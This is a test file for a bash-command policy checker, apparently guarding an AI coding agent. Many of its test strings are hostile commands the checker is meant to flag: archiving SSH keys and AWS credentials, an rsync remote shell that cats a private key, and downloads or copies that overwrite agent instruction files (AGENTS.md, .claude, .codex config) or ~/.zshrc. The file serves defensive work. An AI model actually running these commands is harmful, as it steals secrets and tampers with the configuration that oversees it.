import { expect, it } from "vitest";
import { parseBash } from "./bash";
import { judge } from "./policy";

const bash = (command: string) => judge(parseBash(command), { cwd: "/repo", home: "/users/test" });

it.each([
  "tar -cf /tmp/o.tar -L ~/.ssh/id_rsa",
  "tar -cf /tmp/o.tar -L ~/.ssh/id_rsa src",
  "tar -cf /tmp/o.tar -I ~/.ssh/id_rsa",
  "tar -cf /tmp/o.tar -I ~/.aws/credentials",
  "tar -cf /tmp/o.tar -I ~/.ssh/id_rsa src",
  "tar -cf /tmp/o.tar -b ~/.ssh/id_rsa",
  "tar -cf /tmp/o.tar -s ~/.ssh/id_rsa",
  "tar -cf /tmp/o.tar --exclude ~/.ssh/id_rsa src",
  "tar -cf /tmp/o.tar --exclude=~/.ssh/id_rsa src",
  "tar -cf/tmp/o.tar -I~/.ssh/id_rsa src",
  "tar -cf /tmp/o.tar -W file=~/.ssh/id_rsa src",
])("checks every tar value as a read: %s", (command) => {
  expect(bash(command)).toMatchObject({
    findings: expect.arrayContaining([expect.objectContaining({ rule: "sensitive-path" })]),
  });
});

it.each([
  "tar -c -Bf AGENTS.md src",
  "tar -c -Sf AGENTS.md src",
  "tar -c -wf AGENTS.md src",
  "tar -r -Bf AGENTS.md src",
  "tar --create -Sf AGENTS.md src",
  "tar -Bf AGENTS.md -c src",
  "tar Bf AGENTS.md -c src",
  "tar -cLf AGENTS.md src",
  "tar -cvLf AGENTS.md src",
  "tar cLf AGENTS.md src",
  "tar -cLf ~/.codex/config.toml src",
  "tar -c -L -f AGENTS.md src",
  "tar -c -W file=AGENTS.md src",
  "tar -cW file=AGENTS.md src",
  "tar -c -Wfile=AGENTS.md src",
  "tar -cf /tmp/o.tar -W file=AGENTS.md src",
  "tar -cf /tmp/x.tar -T AGENTS.md",
  "tar -c -BfAGENTS.md src",
  "tar -cf /tmp/o.tar --unknown=file=AGENTS.md src",
  "tar -Af AGENTS.md src",
  "tar Af AGENTS.md src",
  "tar --catenate -f AGENTS.md src",
  "tar --concatenate --file=AGENTS.md src",
  "tar -W create -f AGENTS.md src",
  "tar -W append -f AGENTS.md src",
  "tar -W create -W file=AGENTS.md src",
  "tar -f AGENTS.md -W create src",
  "tar -W create -f ~/.codex/config.toml src",
  "tar -W catenate -f AGENTS.md x.tar",
  "tar -W concatenate -f AGENTS.md x.tar",
  "tar -W update -f AGENTS.md src",
  "tar -Wcreate -f AGENTS.md src",
])("checks every tar value in whole-command write mode: %s", (command) => {
  expect(bash(command)).toMatchObject({
    findings: expect.arrayContaining([expect.objectContaining({ rule: "agent-config-write" })]),
  });
});

it("checks BSD tar -W write mode against startup files", () => {
  expect(bash("tar -W create -f ~/.zshrc src")).toMatchObject({
    findings: expect.arrayContaining([expect.objectContaining({ rule: "startup-mutation" })]),
  });
});

it.each([
  ["tar -c -W file=/users/test/.zshrc src", "startup-mutation"],
  ["tar -c -W file=/users/test/.ssh/config src", "sensitive-path"],
  ["tar -xf x.tar --directory=/users/test/.zshrc", "startup-mutation"],
  ["tar -xf x.tar -C /users/test/.ssh/config", "sensitive-path"],
])("applies every tar destination rule: %s", (command, rule) => {
  expect(bash(command)).toMatchObject({
    findings: expect.arrayContaining([expect.objectContaining({ rule })]),
  });
});

it.each(["tar -xf x.tar", "tar -tvf x.tar", "tar -Af /tmp/x.tar src", "tar -W verbose -xf x.tar"])(
  "accepts ordinary tar modes: %s",
  (command) => expect(bash(command)).toEqual({ kind: "pass" }),
);

it.each([
  "tar -cf out.tar -T files.txt",
  "tar -cf out.tar --files-from files.txt",
  "tar -cf out.tar -X excl.txt src",
  "tar -cvf out.tar -I zstd src",
  "tar -cf out.tar -b 20 src",
  "tar -cf out.tar -L 100 src",
  "tar -cf /tmp/o.tar -n src",
  "tar -cf /tmp/o.tar -l src",
  "tar -cvf /tmp/o.tar -s /a/b/ src",
  "tar -xf x.tar -O",
  "tar -xOf x.tar",
  "tar xOf x.tar",
  "tar -xf x.tar -k",
  "tar -xkf x.tar",
  "tar xkf x.tar",
  "tar -xmf x.tar",
  "tar xmf x.tar",
  "tar -xf x.tar -U",
  "tar -xvf x.tar -W",
  "tar -xf x.tar -s /a/b/",
  "tar -cf out.tar --exclude build src",
  "tar -cf out.tar -q src",
  "tar -xqf x.tar",
  "tar xqf x.tar",
])("accepts tar options outside ambiguous write keys: %s", (command) => {
  expect(bash(command)).toEqual({ kind: "pass" });
});

it.each([
  "wget --execute=output_document=AGENTS.md https://example.com/x",
  "wget --execute=output_document=/Users/test/.zshrc https://example.com/x",
  "wget --execute=dir_prefix=/Users/test/.codex https://example.com/config.toml",
  "wget --execute=input=urls.txt https://example.com/x",
  "wget --config=/tmp/evil.rc https://example.com/x",
  "wget --input-metalink=x.meta4",
  "wget -e input=urls.txt",
  "wget -e dir_prefix=/tmp https://example.com/x",
  "wget -e output_document=AGENTS.md https://example.com/x",
  "wget --execute output_document=AGENTS.md https://example.com/x",
  "wget --config /tmp/evil.rc https://example.com/x",
  "wget --input-metalink x.meta4",
  "wget -eoutput_document=AGENTS.md https://example.com/x",
])("refuses indirect wget output configuration: %s", (command) => {
  expect(bash(command)).toMatchObject({
    findings: expect.arrayContaining([expect.objectContaining({ rule: "no-analyzer" })]),
  });
});

it.each([
  "printf x > ./AGENT?.md",
  "printf x > ./AGENT[]S].md",
  "printf x >> ./AGENT[]S].md",
  "printf x > ./AGENT[S].md",
  "echo x | tee /tmp/output > ./AGENT[]S].md",
  "echo x | tee /tmp/output > ./AGENT?.md",
  "cp /tmp/evil/AGENTS.md ~/repo",
  "cp -R .claude ~/claude-backup",
  "cp -R /tmp/evil/.codex ~/somedir",
  "ln -s /tmp/evil/AGENTS.md /repo",
  "cp -r /tmp/evil/.claude ~/repo",
  "cp /tmp/evil/.mcp.json /repo",
  "rsync /tmp/x ~/.codex/AGENTS.md",
  "rsync -a /tmp/evil/ ~/.claude/",
  "ditto /tmp/x ~/.codex/AGENTS.md",
  "wget -O AGENTS.md https://example.com/x",
  "tar -xf /tmp/x.tar -C ~/.claude",
  "unzip /tmp/x.zip -d ~/.codex",
  "git checkout /tmp/x -- AGENTS.md",
  "patch AGENTS.md /tmp/x.patch",
  "truncate -s 0 AGENTS.md",
  "touch ~/.codex/AGENTS.md",
  "touch AGENT?.md",
  "touch ./AGENT[]S].md",
  "sed --in-pl=bak -e s/a/b/ AGENTS.md",
  "sed --in-pl AGENTS.md",
  "sed --in-pl s/a/b/ AGENTS.md",
  "sed --in s/a/b/ ~/.codex/AGENTS.md",
  "sort --out=AGENTS.md /tmp/x",
  "sort --outp=./AGENTS.md in.txt",
  "base64 --out=AGENTS.md /tmp/x",
  "tar --dir=~/.claude -xf /tmp/x.tar",
  "tar --direc=~/.claude -xf /tmp/x.tar",
  "patch --out=AGENTS.md public.txt /tmp/x.patch",
  "wget --output-d=AGENTS.md https://example.com/x",
  "wget --output-doc=AGENTS.md https://example.com/x",
  "tmutil restore /Volumes/TM/x/AGENTS.md AGENTS.md",
  "tmutil restore /Volumes/Backup/x ~/.claude/settings.json",
  "tar -cf AGENTS.md /tmp/evil",
  "tar --create --file=AGENTS.md /tmp/evil",
  "tar -cv -f AGENTS.md /tmp/evil",
  "tar --cre -f AGENTS.md /tmp/evil",
  "wget https://example.com/AGENTS.md",
  "wget --directory-prefix=~/.codex https://example.com/config.toml",
  "wget -P ~/.codex https://example.com/config.toml",
  "wget -P ~/.claude https://example.com/settings.json",
  "tar czf ~/.claude/settings.json src",
  "tar czf AGENTS.md src",
  "tar -rf ~/.codex/config.toml src",
  "tar -rf AGENTS.md x",
  "tar -uf AGENTS.md src",
  "tar -uf AGENTS.md x",
  "tar --append -f AGENTS.md x",
  "tar --append --file=AGENTS.md src",
  "tar --app -f AGENTS.md src",
  "tar --update -f AGENTS.md src",
  "tar cfz AGENTS.md src",
  "tar cpf ~/.claude/settings.json src",
  "tar cpzf AGENTS.md src",
  "tar caf AGENTS.md src",
  "tar chf AGENTS.md src",
  "tar cPf AGENTS.md src",
  "tar -cpf AGENTS.md src",
  "tar -caf AGENTS.md src",
  "tar -cvpf AGENTS.md src",
  "tar -cpzf ~/.codex/config.toml src",
  "wget -P ~/.codex -i urls.txt",
  "tar vczf AGENTS.md src",
  "tar rf AGENTS.md src",
  "tar uf AGENTS.md src",
  "wget -a AGENTS.md https://example.com/x",
  "wget --append-output=AGENTS.md https://example.com/x",
  "git checkout HEAD AGENTS.md",
  "git checkout -p HEAD ./AGENTS.md",
])("refuses protected writes: %s", (command) => {
  expect(bash(command)).toMatchObject({
    findings: expect.arrayContaining([expect.objectContaining({ rule: "agent-config-write" })]),
  });
});

it.each([
  "cp AGENTS.md /tmp/x.md",
  "cp AGENTS.md ~/backup.md",
  "printf x > ./REPORT?.md",
  "cp -R .claude /tmp/claude-backup",
  "cp AGENTS.md /private/tmp/backup",
  "cp AGENTS.md /var/folders/test/backup",
  "cp AGENTS.md /private/var/folders/test/backup",
  'TMPDIR=/private/tmp/job; cp AGENTS.md "$TMPDIR/backup"',
  "rsync /tmp/x /tmp/y",
  "rsync -e ssh -a src/ host:/srv/",
  "rsync --rsh='ssh -p 2222' -a src/ host:/srv/",
  "ditto /tmp/x /tmp/y",
  "wget -O /tmp/x https://example.com/x",
  "tar -xf /tmp/x.tar -C /tmp/out",
  "tar -cf /tmp/out.tar public.txt",
  "tar -xf/repo/.codex/config.toml",
  "wget https://example.com/public.txt",
  "wget -P downloads https://example.com/x",
  "wget -P /tmp https://example.com/x",
  "wget -t 3 https://example.com/x",
  "wget -t 3 https://example.com/x.zip",
  "wget --tries 3 https://example.com/x.zip",
  "wget -T 10 https://example.com/x.zip",
  "wget -U agent https://example.com/x.zip",
  "wget --limit-rate 1m https://example.com/x.zip",
  "wget -a log.txt https://example.com/x",
  "wget --directory-prefix downloads --timeout 10 --user-agent agent --header 'Accept: text/plain' -l 2 -q -c -N -r -np -nd -nc https://example.com/x",
  "tar czf /tmp/out.tar src",
  "tar -czf /tmp/x.tgz src",
  "tar -cpf /tmp/x.tar src",
  "wget -i urls.txt -O /tmp/out",
  "wget --input-file=urls.txt --output-document=/tmp/out",
  "wget -P /tmp -i urls.txt",
  "wget --directory-prefix=/private/tmp --input-file=urls.txt",
  "wget -P /var/folders/job -i urls.txt",
  'TMPDIR=/private/tmp/job; wget -P "$TMPDIR" -i urls.txt',
  "tar cfz /tmp/out.tar src",
  "tar -rf /tmp/out.tar src",
  "tar -uf /tmp/out.tar src",
  "tar --append --file=/tmp/out.tar src",
  "tar vczf /tmp/out.tar src",
  "tar tf /tmp/out.tar",
  "tar xf /tmp/out.tar",
  "wget -O /tmp/x https://example.com/AGENTS.md",
  "unzip /tmp/x.zip -d /tmp/out",
  "git checkout main -- public.txt",
  "git checkout main public.txt",
  "patch public.txt /tmp/x.patch",
  "truncate -s 0 public.txt",
  "touch public.txt",
  "touch .env",
  "touch build/*.o",
  "tmutil restore public /tmp/x",
  "tmutil restore /Volumes/TM/a /tmp/x",
  "tmutil restore",
])("accepts ordinary operands: %s", (command) => {
  expect(bash(command)).toEqual({ kind: "pass" });
});

it.each(["jq --rawf /tmp/x.txt file.txt", "jq --slurpf=/tmp/x.txt file.txt"])(
  "keeps dangerous prefix fallback: %s",
  (command) => {
    expect(bash(command)).toMatchObject({
      findings: expect.arrayContaining([expect.objectContaining({ rule: "no-analyzer" })]),
    });
  },
);

it("keeps restore startup writes blocked", () => {
  expect(bash("tmutil restore /Volumes/Backup/x ~/.zshrc")).toMatchObject({
    findings: expect.arrayContaining([expect.objectContaining({ rule: "startup-mutation" })]),
  });
});

it.each([
  "wget -i urls.txt",
  "wget --input-file urls.txt",
  "wget --input-file=urls.txt",
  "wget -i -",
  "wget -B https://example.com/ -i urls.txt",
  "wget -P /tmp/../repo -i urls.txt",
  "tar -cqf AGENTS.md src",
  "tar cqf AGENTS.md src",
])("refuses unknown output paths: %s", (command) => {
  expect(bash(command)).toMatchObject({
    findings: expect.arrayContaining([expect.objectContaining({ rule: "no-analyzer" })]),
  });
});

it.each([
  "wget -P ~ https://example.com/.zshrc",
  "wget -P ~ https://example.com/.profile",
  "wget -P ~ https://example.com/.bashrc",
  "wget -O ~/.zshrc https://example.com/x",
])("refuses wget startup writes: %s", (command) => {
  expect(bash(command)).toMatchObject({
    findings: expect.arrayContaining([expect.objectContaining({ rule: "startup-mutation" })]),
  });
});

it.each([
  "wget -P ~ https://example.com/.npmrc",
  "wget -P ~/.ssh https://example.com/config",
  "wget -P ~ https://example.com/.envrc",
])("refuses wget sensitive destinations: %s", (command) => {
  expect(bash(command)).toMatchObject({
    findings: expect.arrayContaining([expect.objectContaining({ rule: "sensitive-path" })]),
  });
});

it.each([
  "rsync -e 'ssh -F ~/.ssh/config' src/ host:/srv/",
  "rsync -e 'cat ~/.ssh/id_rsa' src/ host:/srv/",
])("inspects remote shell arguments: %s", (command) => {
  expect(bash(command)).toMatchObject({
    findings: expect.arrayContaining([expect.objectContaining({ rule: "sensitive-path" })]),
  });
});

it.each(["tmutil restore ~/.ssh/id_rsa /tmp/x", "tmutil restore /tmp/x ~/.aws/credentials"])(
  "keeps sensitive restore refusal: %s",
  (command) => {
    expect(bash(command)).toMatchObject({
      findings: expect.arrayContaining([expect.objectContaining({ rule: "sensitive-path" })]),
    });
  },
);
